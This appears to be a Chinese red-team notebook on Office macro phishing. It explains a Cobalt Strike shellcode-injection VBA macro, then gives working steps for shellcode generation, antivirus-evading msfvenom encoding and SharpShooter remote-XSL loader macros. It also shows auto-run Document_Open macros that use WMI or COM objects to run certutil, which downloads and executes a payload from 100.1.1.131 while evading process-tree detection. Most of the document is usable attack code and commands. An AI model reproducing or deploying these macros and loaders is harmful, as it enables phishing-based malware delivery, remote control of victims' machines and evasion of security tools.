  rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
  ```

  在目标进程中分配一块内存，并将其权限设置为可执行、可读、可写。分配的内存大小等于 `myArray` 数组的长度。

  ---

  ```vb
  Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (
      ByVal hProcess As Long, 
      ByVal lpAddr As Long, 
      ByVal lSize As Long, 
      ByVal flAllocationType As Long, 
      ByVal flProtect As Long
  ) As Long
  ```

  Windows API 函数 `VirtualAllocEx` 用于在指定的进程的地址空间中分配内存

  ```C++
  LPVOID VirtualAllocEx(
    [in]           HANDLE hProcess,
    [in, optional] LPVOID lpAddress,
    [in]           SIZE_T dwSize,
    [in]           DWORD  flAllocationType,
    [in]           DWORD  flProtect
  );
  ```

  - 参数

    - `hProcess`: 进程的句柄。该函数在此进程的虚拟地址空间内分配内存。

      该句柄必须具有 PROCESS_VM_OPERATION 访问权限。

      > 这里传入的是 `pInfo.hProcess`, 表示在此进程中分配内容
      >
      > ![image-20240703172820021](http://cdn.ayusummer233.top/DailyNotes/202407031728440.png)

    - `lpAddress`: 为要分配的页面区域指定所需起始地址的指针。

      如果您要保留内存，该函数会将此地址向下舍入到最接近的分配粒度倍数。

      如果您提交已保留的内存，则该函数会将此地址向下舍入到最近的页边界。

      如果 lpAddress 为 NULL，则该函数确定在何处分配区域。

      如果此地址位于您尚未通过调用 InitializeEnclave 初始化的飞地内，则 VirtualAllocEx 会为该地址处的飞地分配一个零页。该页面之前必须未提交，并且不会使用 Intel Software Guard Extensions programming model 的 EEXTEND 指令进行测量。

      > 这里传入的是 `0` NULL, 意指让系统决定内容区域的地址

    - `lSize`(`dwSize`)

      要分配的内存区域的大小（以字节为单位）

      如果 lpAddress 为 NULL，则该函数将 dwSize 向上舍入到下一页边界

      如果lpAddress不为NULL，则该函数分配包含从lpAddress到lpAddress+dwSize范围内的一个或多个字节的所有页。这意味着，例如，跨越页面边界的 2 字节范围会导致函数分配两个页面。

      > 这里传入的是 `UBound(myArray)` 返回数组 `myArray` 的最大索引, 是内存大小

    - `flAllocationType`

      > [VirtualAllocEx 函数(memoryapi.h) - Win32 应用程序| VirtualAllocEx 函数(memoryapi.h) - Win32 应用程序微软学习 --- VirtualAllocEx function (memoryapi.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

      内存分配的类型

      ![image-20240703173602705](http://cdn.ayusummer233.top/DailyNotes/202407031736908.png)

      > 这里传入的是 `&H1000`, 是常量 `MEM_COMMIT` 的十六进制表示，表示分配物理内存并将内存保留为已提交状态。

    - `flProtect`

      > [Memory Protection Constants (WinNT.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)

      对要分配的页面区域的内存保护。如果正在提交页面，则可以指定任一内存保护常量。

      ![image-20240703174917644](http://cdn.ayusummer233.top/DailyNotes/202407031749839.png)

      > 这里传入的是 `&H40` 是常量 PAGE_EXECUTE_READWRITE 的十六进制表示，表示分配的内存页面具有执行、读取和写入权限。

- **写入代码**：将硬编码的字节数组（可能是shellcode或恶意代码）写入分配的内存页中

  ```vb
  For offset = LBound(myArray) To UBound(myArray)
      myByte = myArray(offset)
      res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
  Next offset
  ```

  - **`For offset = LBound(myArray) To UBound(myArray)`**
    - 循环遍历 `myArray` 数组中的每一个元素。
    - `LBound(myArray)` 返回数组的下界（通常是 0）。
    - `UBound(myArray)` 返回数组的上界（数组的最后一个索引）。
  - **`myByte = myArray(offset)`**
    - 将当前索引 `offset` 对应的 `myArray` 元素值赋给 `myByte`。
  - **`res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)`**
    - `WriteStuff` 是一个声明的 API 函数别名，指向 Windows API 函数 `WriteProcessMemory`。
    - 这个调用将 `myByte` 写入目标进程的内存中。
    - `pInfo.hProcess`: 目标进程的句柄。
    - `rwxpage + offset`: 目标进程内存地址，`rwxpage` 是之前分配的内存起始地址，加上当前偏移量 `offset`。
    - `myByte`: 要写入的字节。
    - `1`: 要写入的字节数。
    - `ByVal 0&`: 用于接收实际写入的字节数，这里忽略它，所以传递 `0&`。

- **创建远程线程**：在目标进程中创建一个远程线程来执行写入的代码。

  ```vb
  res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
  ```

  - **`CreateStuff`**
    - `CreateStuff` 是一个声明的 API 函数别名，指向 Windows API 函数 `CreateRemoteThread`。
    - 这个调用在目标进程中创建一个新的线程来执行之前写入的字节。
  - **参数解释**
    - `pInfo.hProcess`: 目标进程的句柄。
    - `0`: 线程属性，通常为 `NULL`。
    - `0`: 栈大小，通常为 `0` 使用默认大小。
    - `rwxpage`: 新线程的起始地址，即之前分配并写入数据的内存地址。
    - `0`: 传递给新线程的参数，这里为 `NULL`。
    - `0`: 创建标志，通常为 `0` 表示默认创建。
    - `0`: 用于接收线程 ID，这里忽略它，所以传递 `0`。

---

#### 结构体定义

> 仅作参考

```vb
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

```

定义了进程和启动信息，用于在创建新进程和线程时传递信息。

- `Long`: 32位的有符号整数。它的取值范围是从 `-2,147,483,648` 到 `2,147,483,647`

  - 为了兼容64位系统，VBA7引入了`LongPtr`类型，它可以在32位系统上表示32位整数，在64位系统上表示64位整数。

    上述 CS 生成的 VBA 宏中的如下部分就使用了此种类型

    ```vb
    #If VBA7 Then
        Private Declare PtrSafe Function CreateStuff ...
        Dim rwxpage As LongPtr, res As LongPtr
    #Else
        Private Declare Function CreateStuff ...
        Dim rwxpage As Long, res As Long
    #End If
    ```

---

#### 函数声明

> 仅作参考

```vb
#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If
```

这些声明引用了Windows API函数，用于在VBA环境中调用它们。根据VBA版本（VBA7或更早版本），使用不同的声明方式。

- `CreateStuff`

  ```vb
  Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (
      ByVal hProcess As Long, 
      ByVal lpThreadAttributes As Long, 
      ByVal dwStackSize As Long, 
      ByVal lpStartAddress As Long, 
      lpParameter As Long, 
      ByVal dwCreationFlags As Long, 
      lpThreadID As Long
  ) As Long
  ```

  将 Windows API 中的 `CreateRemoteThread` 函数声明为一个名为 `CreateStuff`的VBA函数。
  
  - `Lib "kernel32" Alias "CreateRemoteThread"`
  
    - `Lib "kernel32"`：指定函数位于`kernel32.dll`库中，这是Windows操作系统的一个核心库
    - `Alias "CreateRemoteThread"`：指明VBA中的`CreateStuff`函数实际调用的是`CreateRemoteThread`函数
  
  - `ByVal(By Value)`: 传值, `ByRef(By Reference)`: 传引用, 如果没有标识是传值(ByVal) 还是传引用(ByRef) 的话默认是传引用(ByRef)
  
  - `CreateRemoteThread`
  
    `CreateRemoteThread`函数在指定的进程中创建一个线程。这个函数通常用于进程间通信或进程注入操作。
  
    其参数如下所示
  
    - `hProcess`
  
      目标进程的句柄，该进程中将创建新线程
  
      句柄必须有`PROCESS_CREATE_THREAD`、`PROCESS_QUERY_INFORMATION`、`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`和`PROCESS_VM_READ`权限
  
    - `lpThreadAttributes`
  
      `SECURITY_ATTRIBUTES`结构的指针，确定新线程的安全属性。如果该参数为`NULL`，新线程将具有默认的安全属性。
  
    - `dwStackSize`
  
      新线程的初始堆栈大小，以字节为单位。如果该参数为0，系统将使用默认大小
  
    - `lpStartAddress`
  
      指向新线程起始地址的指针，即线程函数的指针。当线程被创建时，它将从这个地址开始执行。
  
    - `lpParameter`
  
      传递给线程函数的参数。这个参数可以是任何类型的指针，并将作为线程函数的参数传递。
  
    - `dwCreationFlags`
  
      线程创建标志。可以是以下值之一或它们的组合：
  
      - `0`：立即运行线程。
      - `CREATE_SUSPENDED`：创建线程，但不立即运行它。
  
    - `lpThreadID`
  
      指向接收新线程标识符的变量的指针。如果该参数为`NULL`，则不返回线程标识符。
  
  ---
  
  - 功能: 创建并启动一个在另一个进程地址空间中运行的新线程
  - 参数
    - `hProcess`：一个进程的句柄，该进程是新线程的宿主
    - `lpThreadAttributes`：一个指向安全属性的指针，决定新线程的继承句柄（通常设置为`0`）
    - `dwStackSize`：新线程的初始堆栈大小（以字节为单位，通常设置为`0`以使用默认大小）
    - `lpStartAddress`：新线程的起始地址（函数指针）
    - `lpParameter`：传递给新线程的参数
    - `dwCreationFlags`：线程的创建选项（例如，`0`表示立即运行）
    - `lpThreadID`：一个指向接收新线程ID的变量的指针
  - **返回值**：返回新线程的句柄，失败时返回`0`

---

## VBA宏加载远程XSL(XMLDOM)

> [加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish (uknowsec.cn)](https://uknowsec.cn/posts/notes/加载远程XSL文件的宏免杀方法.html)
>
> [Macros and More with SharpShooter v2.0 - MDSec](https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/)
>
> [GitHub - mdsecactivebreach/SharpShooter: Payload Generation Framework](https://github.com/mdsecactivebreach/SharpShooter)
>
> ---
>
> [针对Office宏病毒的高级检测-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/267298)
>
> ---
>
> [Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)](https://www.jianshu.com/p/8b01fca2c177)

---

### 概念

> [XML文档对象模型 --- XML DOM (w3schools.com)](https://www.w3schools.com/xml/xml_dom.asp)

DOM(Document Object Model)文档对象模型定义了访问和操作文档的标准

HTML DOM 定义了访问 HTML 文档的标准方法, 它将 HTML 文档呈现为树结构

XML DOM 定义了访问和操作 XML 文档的标准方法, 它将 XML 文档呈现为树结构

---

以 HTML 和 HTML DOM 为例进行区分

- HTML

  - `定义`: HTML 是一种标记语言，用于创建网页的结构和内容。它通过一系列标签（如 `<div>`, `<p>`, `<a>` 等）来定义网页的元素。
  - `功能`: 
    - 描述网页的结构和内容：使用标签来定义标题、段落、链接、图像、表格等元素。
    - 标记内容：通过标签和属性来提供内容的语义信息，如 `<h1>` 表示主标题，`<p>` 表示段落。
  - `静态`: HTML 文档本身是静态的，它只是描述了网页在浏览器中如何呈现。

  例如

  ```html
  <!DOCTYPE html>
  <html>
  <head>
    <title>HTML 示例</title>
  </head>
  <body>
    <h1>Hello, World!</h1>
    <p>这是一个段落。</p>
  </body>
  </html>
  ```

- HTML DOM

  - `定义`:  HTML DOM 是浏览器解析 HTML 文档后生成的对象模型。它表示文档的结构，允许编程语言（主要是 JavaScript）动态访问和操作文档。
  - `功能`
    - 访问和修改：通过 DOM，开发者可以动态地访问和修改文档的内容、结构和样式。例如，添加新的节点、删除现有节点、修改节点的属性和文本内容等。
    - 事件处理：DOM 提供事件模型，允许开发者注册事件处理程序，以响应用户的交互（如点击、输入等）。
  - `动态`: HTML DOM 是动态的，通过编程接口，开发者可以在浏览器中实时更新和操作文档。

---

### 利用方案

#### 生成 Shellcode(Payload.bin)


用 `CobaltStrike` 生成 Shellcode

![image-20240704111814786](http://cdn.ayusummer233.top/DailyNotes/202407041118750.png)

![image-20240704152434887](http://cdn.ayusummer233.top/DailyNotes/202407041524657.png)

![image-20240704152857774](http://cdn.ayusummer233.top/DailyNotes/202407041528183.png)

----

#### 处理 payload.bin

由于 `SharpShooter`要求shellcode中不能含有空字节, 所以要用 msfvenom 处理下生成的 payload.bin

```bash
msfvenom -p generic/custom PAYLOADFILE=./payload_raw_x86_131_80.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b "\x00"
```

- `-p generic/custom`：指定使用自定义的 payload。

- `PAYLOADFILE=./payload.bin`：指定自定义 payload 的文件路径，这里是当前目录下的 `payload.bin` 文件。

- `-a x86`：指定目标架构为 x86（32 位）。

- `--platform windows`：指定目标平台为 Windows。

- `-e x86/shikata_ga_nai`：使用 `x86/shikata_ga_nai` 编码器对 payload 进行编码。

  `shikata_ga_nai` 是一种多态编码器，能有效地混淆 payload，以绕过防病毒软件的检测。

- `-f raw`：指定输出格式为原始二进制格式（raw）。

- `-o shellcode-encoded.bin`：指定输出文件名为 `shellcode-encoded.bin`。

- `-b "\x00"`：指定在编码过程中要避免的字节，这里是 `\x00`（空字节），通常为了防止字符串终止符影响 payload 的执行。

---

#### 生成 xsl 和 macro

```bash
# clone SharpShooter Repo
git clone https://github.com/mdsecactivebreach/SharpShooter.git

// 代理
git clone https://ghproxy.org/https://github.com/mdsecactivebreach/SharpShooter.git

cd SharpShooter
virtualenv -p python2 ss2
source ss2/bin/activate
pip install -r requirements.txt

# 生成 xsl 和 macro 文件
python SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ../shellcode-encoded.bin --com xslremote --awlurl http://100.1.1.131:8000/download/foo.xsl

```

- –dotnetver：为目标的.net版本，可选2或者4
- –awlurl： xsl存放地址

![image-20240704174338316](http://cdn.ayusummer233.top/DailyNotes/202407041743965.png)

---

`foo.macro`: 创建一个 COM 对象加载远程 XSL

```vb
Sub Auto_Open()
    Set XML = CreateObject("Microsoft.XMLDOM")
    XML.async = False
    Set xsl = XML
    xsl.Load "http://100.1.1.131:8000/download/foo.xsl"
    XML.transformNode xsl
End Sub
```

![image-20240705100413007](http://cdn.ayusummer233.top/DailyNotes/202407051004339.png)

`foo.xsl`中包含了处理后的 shellcode

![image-20240704174925409](http://cdn.ayusummer233.top/DailyNotes/202407041749735.png)

---

1. 新建启用宏的 word 文档 `VBA_XMLDOM.docm`

2. 在 Word 中编辑宏脚本(ALT+F11)

3. 在“工程 – Project”窗口中，双击“Microsoft Word 对象”，再双击“ThisDocument”。

4. 此时在右侧代码窗口顶部，会看到两个列表框，单击左侧下拉列表，将其从“（通用）”更改为“Document”，单击右侧下拉列表，从列表中选择“Close”或“Open”以插入 Document_Close()或 Document_Open()过程，或者可直接在代码窗口输入过程名。

```vb
Sub Auto_Open()
    Set XML = CreateObject("Microsoft.XMLDOM")
    XML.async = False
    Set xsl = XML
    xsl.Load "http://100.1.1.131:8000/download/foo.xsl"
    XML.transformNode xsl
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
```

保存然后重新打开这个 docm 文档

![image-20240705103356923](http://cdn.ayusummer233.top/DailyNotes/202407051033298.png)

![image-20240705103555605](http://cdn.ayusummer233.top/DailyNotes/202407051035870.png)

---

可以看到的是这样虽然可以上线, 但是 word 进程会崩, 如果结束 word 进程那么相应的 cs 也会掉线, 因此需要将上线目标迁移到其他进程上

> [加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish (uknowsec.cn)](https://uknowsec.cn/posts/notes/加载远程XSL文件的宏免杀方法.html)

- Cobalt Strike：通过插件实现上线后自动迁移进程，[Beacon Handler Suite](https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler)
- Metasploit: 在设置监听的时间可以设置：`set autorunscript migrate -N explorer.exe 或 set autorunscript -f`

> TODO: 看下这个进程迁移是怎么实现的

---

## 相关链接

- [钓鱼姿势汇总 - 简书 (jianshu.com)](https://www.jianshu.com/p/dcd250593698)
- [常见钓鱼招式 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD)

---

## 宏免杀

> [cobal strike 钓鱼----word宏木马（免杀） - 江楠O_O - 博客园 (cnblogs.com)](https://www.cnblogs.com/nanjiangyue/p/14009407.html)
>
> [wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/317116.html)
>
> [干货 | Office文档钓鱼之如何快速进行宏免杀 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247502110&idx=1&sn=2442cfc935de67607f986140e8c8ad4e&chksm=ec1c9c21db6b1537dc321bd939da8cc3bfe5917245867bf666ae0d9764c950cd510973bb067b&mpshare=1&scene=23&srcid=1208ExmPmeeluOtedlykpzwj&sharer_sharetime=1638967527162&sharer_shareid=d6f91fc924ad833bb5231d972b990ef9#rd)
>
> [干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1917641)
>
> ---
>
> [红队渗透测试技术：如何通过鱼叉式网络钓鱼获得攻击机会？ - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com](https://www.4hou.com/posts/mMZE)

---

### 绕过基于进程树的检测

#### 连接到 WMI 新建进程

```vb
Private Sub Document_Open()
' 通过WMI连接到本地计算机的 CIMv2 命名空间，并设置模拟级别为“impersonate”，以允许脚本以调用者的权限运行WMI操作
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
' 获取 Win32_ProcessStartup 类的一个实例，该类包含进程启动配置的相关信息
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
' 创建 Win32_ProcessStartup 类的一个新实例，这个实例将用于配置新进程的启动参数。
Set objConfig = objStartup.SpawnInstance_
' 获取 Win32_Process 类的实例，该类用于创建和管理进程
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
' 创建一个新的进程，运行计算器程序（calc），将启动参数传递给新进程，并返回进程ID
errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
End Sub
```

```vb
Private Sub Document_Open()
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
End Sub
```

![image-20240712160058099](http://cdn.ayusummer233.top/DailyNotes/202407121600420.png)

![image-20240711144920180](http://cdn.ayusummer233.top/DailyNotes/202407111449956.png)

---

```vb
Private Sub Document_Open()
' 通过WMI连接到本地计算机的 CIMv2 命名空间，并设置模拟级别为“impersonate”，以允许脚本以调用者的权限运行WMI操作
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
' 获取 Win32_ProcessStartup 类的一个实例，该类包含进程启动配置的相关信息
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
' 创建 Win32_ProcessStartup 类的一个新实例，这个实例将用于配置新进程的启动参数。
Set objConfig = objStartup.SpawnInstance_
' 获取 Win32_Process 类的实例，该类用于创建和管理进程
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
' 创建一个新的进程，运行计算器程序（calc），将启动参数传递给新进程，并返回进程ID
errReturn = objProcess.Create("cmd /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe && del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete", Null, objConfig, intProcessID)
End Sub 
```

![image-20240712111753018](http://cdn.ayusummer233.top/DailyNotes/202407121117017.png)

---

#### 获取 WSH 对象调用 cmd 执行命令

>  [Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)](https://www.jianshu.com/p/8b01fca2c177)

COM（Component Object Model）对象是通过一个或多个相关函数集来实现对对象数据的访问的对象。这些函数集被称为接口，接口的函数被称为方法。

COM 基本上可以从VBScript引用任何COM对象(实际上是另一个可执行文件)并使用它的函数。例如，对象 `ShellBrowserWindow` 可以用来从资源管理器执行新的进程。

`CreateObject` 是 VBScript 提供的一个函数，用于创建 COM 对象。

----

Windows 操作系统自带了 Windows Script Host 环境，允许使用脚本语言（如 VBScript 和 JScript）来自动化任务。通过 WSH，可以创建 `WScript.Shell` 对象来运行命令、打开文件、操作系统等。

---

弹个计算器:

```vb
Sub ducument_open()
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "calc", Null, "C:\\Windows\\System32", Null, 0
End Sub
```

- `Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")`:  创建一个新的COM对象。``C08AFD90-F2A1-11D1-8455-00A0C91F3880` 是 `Windows Script Host Shell` 对象的 `CLSID` （类标识符）。通过这种方式创建的对象提供了一些与 `Windows Shell` 交互的方法和属性

- `obj.Document.Application.ShellExecute "calc", Null, "C:\\Windows\\System32", Null, 0`

  使用Shell对象的 `ShellExecute`  方法来启动一个新进程

  - `"calc"`：要执行的程序名称。
  - `Null`：表示不传递参数给启动的程序。
  - `"C:\\Windows\\System32"`：指定计算器程序所在的目录。
  - `Null`：表示默认使用当前窗口显示模式。
  - `0`：指定程序的启动方式，这里为隐藏模式（0 表示隐藏窗口）。

![image-20240712160406287](http://cdn.ayusummer233.top/DailyNotes/202407121604470.png)

---

调用 CMD 执行 `calc.exe`

```vb
Private Sub Document_Open()
  Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
  obj.Document.Application.ShellExecute "cmd.exe", "/c calc.exe", "C:\Windows\System32", Null, 0
End Sub
```

![image-20240712160940200](http://cdn.ayusummer233.top/DailyNotes/202407121609386.png)

---

调用 cmd 使用 Certutil 下载恶意程序然后执行

```vb
Private Sub Document_Open()
  Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
  obj.Document.Application.ShellExecute "cmd.exe", "/c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe && del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete", "C:\Windows\System32", Null, 0
End Sub
```

![image-20240712161607021](http://cdn.ayusummer233.top/DailyNotes/202407121616272.png)


---

#### stash

> [Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)](https://www.jianshu.com/p/8b01fca2c177)

TODO:

- [ ] 如下是材料收集中标记为未复现成功的绕过方案, 有空研究下

- 通过Scheduled Task使用svchost.exe绕过
- 通过Windows API注入Excel内存绕过

---

# TODO

- [ ] [逆向分析Office VBS宏类型文档](https://www.secpulse.com/archives/205567.html)

---



